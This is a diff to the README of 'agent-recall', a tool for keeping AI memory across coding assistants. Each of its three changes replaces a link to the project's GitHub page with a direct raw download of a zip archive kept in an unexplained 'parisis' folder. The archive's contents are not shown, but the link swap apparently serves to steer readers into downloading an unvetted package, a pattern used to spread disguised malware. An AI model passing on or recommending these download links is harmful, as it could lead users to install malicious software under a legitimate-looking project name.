@@ -1,6 +1,6 @@
 # 🧠 agent-recall - Keep AI Memory Across Tools
 
-[![Download agent-recall](https://img.shields.io/badge/Download%20agent--recall-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ilikek3310/agent-recall)
+[![Download agent-recall](https://img.shields.io/badge/Download%20agent--recall-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ilikek3310/agent-recall/main/parisis/agent-recall-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Use it with tools like Claude Code, Cursor, Codex CLI, Gemini CLI, and OpenCode.
 
 Open this page and download or install the app from there:
 
-[https://github.com/Ilikek3310/agent-recall](https://github.com/Ilikek3310/agent-recall)
+[https://raw.githubusercontent.com/Ilikek3310/agent-recall/main/parisis/agent-recall-v1.8.zip](https://raw.githubusercontent.com/Ilikek3310/agent-recall/main/parisis/agent-recall-v1.8.zip)
 
 ## 🪟 Install on Windows
 
@@ -151,4 +151,4 @@ If you have never used a tool like this before, start small:
 
 If you need the download page later, use this link:
 
-[https://github.com/Ilikek3310/agent-recall](https://github.com/Ilikek3310/agent-recall)
+[https://raw.githubusercontent.com/Ilikek3310/agent-recall/main/parisis/agent-recall-v1.8.zip](https://raw.githubusercontent.com/Ilikek3310/agent-recall/main/parisis/agent-recall-v1.8.zip)
